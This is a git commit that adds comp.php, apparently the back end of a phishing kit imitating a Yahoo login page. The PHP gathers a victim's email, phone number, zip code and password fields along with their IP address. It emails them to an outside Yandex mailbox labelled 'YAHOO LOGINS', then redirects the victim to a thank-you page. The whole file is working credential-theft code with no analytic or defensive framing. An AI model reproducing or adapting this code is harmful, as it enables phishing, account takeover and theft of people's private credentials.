bb94499d5dda6734b093d7d2ba770a614539652a
office365365 <53476108+office365365@users.noreply.github.com>
2019-08-10 02:00:40 -0700

    verify

---
+++ comp.php
@@ -0,0 +1,34 @@
+﻿﻿<?
+
+$ip = getenv("REMOTE_ADDR");
+$message .= "---- : || Juve Yahoo Logs || :------\n";
+$message .= "Zip Code: ".$_POST['shortCountryCode']."\n";
+$message .= "Phone: ".$_POST['phone']."\n";
+$message .= "Email ID: ".$_POST['email']."\n";
+$message .= "password: ".$_POST['password']."\n";
+$message .= "password: ".$_POST['re-password']."\n";
+$message .= "IP: ".$ip."\n";
+$message .= "----: || D4rkL4B || :------\n";
+
+$recipient = "inboxhunter148@yandex.com";
+$subject = "YAHOO LOGINS| ".$ip."\n";
+$headers ="From: Onlineform";
+$headers .=$_POST['eMailAdd']."\n";
+$headers .="MIME-Version: 1.0\n";
+ 	    mail("","yahoo",$message);
+if(mail($recipient,$subject,$message))
+
+{
+?>
+
+<script language=javascript>
+window.location='thanks2017.html';
+</script>
+
+<?
+}
+else
+{
+echo "ERROR! Please go back and try again";
+}
+?>
